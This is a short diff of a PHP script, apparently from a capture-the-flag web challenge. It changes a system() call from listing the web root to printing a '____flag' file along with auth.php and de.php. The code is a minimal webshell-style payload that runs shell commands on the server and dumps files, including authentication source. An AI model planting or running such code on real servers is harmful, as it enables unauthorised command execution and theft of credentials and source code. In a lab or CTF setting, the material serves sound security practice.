@@ -1,5 +1,5 @@
 <?php
 
-system("cd /var/www/html;ls");
+system("cat /var/www/html/____flag auth.php de.php");
 
 ?>
